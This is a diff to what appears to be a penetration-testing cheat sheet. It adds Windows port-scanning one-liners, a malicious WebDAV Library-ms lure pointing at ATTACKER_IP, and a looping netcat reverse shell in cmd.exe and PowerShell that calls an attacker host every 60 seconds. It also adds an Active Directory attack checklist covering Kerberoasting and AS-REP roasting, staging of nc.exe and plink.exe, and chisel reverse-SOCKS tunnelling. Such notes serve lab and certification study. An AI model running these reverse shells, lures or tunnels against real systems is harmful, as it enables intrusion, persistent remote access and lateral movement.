@@ -90,6 +90,9 @@ Test-NetConnection -Port 445 $VICTIM_IP
 
 # scanning multiple ports
 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("VICTIM_IP", $_)) "TCP port $_ is open"} 2>$null
+
+# limited ports to search
+22,25,80,135,139,445,1443,3306,3389,5432 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("VICTIM_IP", $_)) "TCP port $_ is open"} 2>$null
 ```
 
 ## 1.5 Bash Ping Scanner
@@ -3414,7 +3417,7 @@ Change the `<url>` field below, and save it as `Helpers.Library-ms` (or whatever
       <isSupported>false</isSupported>
       <!-- the location, our WebDAV URL -->
       <simpleLocation>
-        <url>http://192.168.45.213:8000</url>  <!-- <===== CHANGE ME!!!!! -->
+        <url>http://ATTACKER_IP:8000</url>  <!-- <===== CHANGE ME!!!!! -->
       </simpleLocation>
     </searchConnectorDescription>
   </searchConnectorDescriptionList>
@@ -5002,11 +5005,16 @@ cmd.exe:
 # restart/reboot the machine now
 shutdown /r /t 0
 
-# infinite loop of command with 5s timeout between runs
+# infinite loop of reverse shell command every 60 seconds
+# in cmd.exe
 for /l %n in () do @(
   @echo Replace with your command here...
-  timeout /t 5 /nobreak > NUL
+  .\nc.exe -e cmd ATTACKER_IP 443
+  timeout /t 60 /nobreak > NUL
 )
+
+# same thing, in powershell
+while ($true) {start-process -NoNewWindow -file .\nc.exe -arg "-e", "cmd", "192.168.251.220", "443"; Start-Sleep -Seconds 60;}
 
 # run regedit as SYSTEM (to view protected keys)
 psexec.exe -i -s regedit.exe
@@ -5228,6 +5236,21 @@ When trying to access an object (like a share drive) in AD, permissions are mana
 
 ## 5.1 Active Directory Enumeration
 
+Checklist:
+- [ ] Kerberoastable accounts
+- [ ] AS-REP Roastable accounts
+- [ ] Find Workstations where Domain Users can RDP
+- [ ] Find Servers where Domain Users can RDP
+- [ ] Find Computers where Domain Users are Local Admin
+- [ ] Shortest Path to Domain Admins (esp. from Owned Principals)
+- [ ] Write-permissions on any critical accounts?
+- [ ] Enumerate:
+	- [ ] Users (interesting permissions)
+	- [ ] Groups (incl. memberships)
+	- [ ] Services
+	- [ ] Computers (which ones have useful sessions?)
+
+
 Before starting, get the tools you might need ready:
 
 ```sh
@@ -5256,6 +5279,12 @@ unzip -d mimikatz mimikatz.zip
 
 # Rubeus.exe for AS-REP roasting, etc.
 wget -O Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
+
+# plink.exe for port redirection/tunneling
+cp /usr/share/windows-resources/binaries/plink.exe .
+
+# nc.exe for reverse/bind shells and port redirection
+cp /usr/share/windows-resources/binaries/nc.exe .
 
 # host the files on a Windows 10+ compatible SMB share
 impacket-smbserver -smb2support -user derp -password herpderp share .
@@ -5442,6 +5471,8 @@ Get-NetLocalGroup -ComputerName NAME
 
 # list all computers
 Get-DomainComputer | select dnshostname,operatingsystem,operatingsystemversion
+# get all IP addresses and hostnames
+resolve-ipaddress @(Get-DomainComputer|%{$_.dnshostname})
 # get IP of specific computer
 Resolve-IPAddress -ComputerName NAME
 
@@ -5939,6 +5970,7 @@ winrs -r:VICTIM -u:ADMINUSER -p:PASSWORD  "cmd /c hostname & whoami"
 
 # using PowerShell
 # variable declaration
+$victim = 'VICTIM';
 $username = 'LOCALADMIN';
 $password = 'PASSWORD';
 # starts same as WMI, creating PSCredential object
@@ -7566,7 +7598,9 @@ where.exe ssh
 ssh.exe -V
 ```
 
-The other option is to copy **`plink.exe`** over to the Windows box:
+The other option is to copy **`plink.exe`** over to the Windows box.
+
+> ⚠ **NOTE:** If you need a SOCKS proxy instead of just direct port forwarding, DON'T use plink! It doesn't support SOCKS. Use chisel instead!!!
 
 ```sh
 # grab copy of plink and host on http for Windows victim
@@ -7822,18 +7856,22 @@ netsh advfirewall firewall delete rule name="derp"
 
 [Chisel](https://github.com/jpillora/chisel) lets you securely tunnel using HTTP as a transport, allowing you to get through Deep Packet Inspection (DPI) firewalls to forward ports or set up a SOCKS proxy.
 
+> ⚠ **NOTE**: The chisel installed on Kali doesn't always play nice with other Linux hosts. Always download the client binary from the repo!
+
+[Chisel Releases Page](https://github.com/jpillora/chisel/releases/latest)
+
 The most common way to use it is as a Reverse SOCKS proxy (reference: [Reverse SOCKS guide](https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29)). Example of Reverse SOCKS proxy setup:
 
 ```bash
 # on attack box
 # start reverse socks proxy server on port 8080:
-chisel server -p 8000 --reverse
+./chisel server -p 8000 --reverse
 
 # grab windows chisel.exe binary from:
 # https://github.com/jpillora/chisel/releases/latest/
 
 # on jumpbox (Windows example), set up reverse SOCKS proxy
-chisel-x64.exe client attacker_ip:8000 R:socks
+.\chisel-x64.exe client attacker_ip:8000 R:socks
 
 # then use proxychains from attack box like normal
 
@@ -7845,7 +7883,6 @@ R:2222:VICTIM_IP:22
 ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:8000 %h %p' victim@VICTIM_IP
 ```
 
-> ⚠ **NOTE**: The chisel installed on Kali doesn't always play nice with other Linux hosts. Always download the client binary from the repo!
 
 ## 8.10 Bending with `dnscat2`
 
